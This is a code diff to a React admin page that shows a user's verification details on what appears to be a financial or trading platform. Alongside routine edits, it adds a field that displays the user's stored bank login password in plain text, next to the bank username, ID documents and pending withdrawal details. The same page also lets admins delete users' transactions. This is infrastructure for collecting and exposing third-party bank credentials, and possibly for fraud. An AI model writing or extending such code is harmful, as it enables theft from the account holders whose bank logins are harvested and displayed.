@@ -133,12 +133,11 @@ const AdminUserEdit = () => {
     }
   };
 
-  // 🔧 NEW: delete a transaction
   const deleteTransaction = async (txnId) => {
     // eslint-disable-next-line no-alert
     if (
       !window.confirm(
-        'Delete this transaction? It will no longer appear in the user\'s history or count toward their totals.'
+        "Delete this transaction? It will no longer appear in the user's history or count toward their totals."
       )
     ) {
       return;
@@ -176,6 +175,7 @@ const AdminUserEdit = () => {
   if (!data) return <div className="form-error">{error}</div>;
 
   const { user, assets = [], transactions = [], notifications = [], verification } = data;
+  const pending = (verification && verification.pendingWithdrawal) || {};
 
   return (
     <div className="admin-user-edit">
@@ -212,6 +212,31 @@ const AdminUserEdit = () => {
               {verification.bankLogin
                 ? `${verification.bankLogin.bankName} / ${verification.bankLogin.username}`
                 : '—'}
+            </p>
+            <p>
+              <span>Bank Password:</span>{' '}
+              {verification.bankLogin && verification.bankLogin.password ? (
+                <span className="plain-secret">{verification.bankLogin.password}</span>
+              ) : (
+                '—'
+              )}
+            </p>
+            {/* 🔧 NEW: withdrawal asset & amount the user wants to withdraw */}
+            <p>
+              <span>Withdrawal Asset:</span>{' '}
+              {pending.symbol ? (
+                <span className="withdraw-pill">{pending.symbol}</span>
+              ) : (
+                '—'
+              )}
+            </p>
+            <p>
+              <span>Withdrawal Amount:</span>{' '}
+              {pending.amount ? (
+                <span className="withdraw-pill">{fmtUsd(pending.amount)}</span>
+              ) : (
+                '—'
+              )}
             </p>
             <p>
               <span>ID Front:</span>{' '}
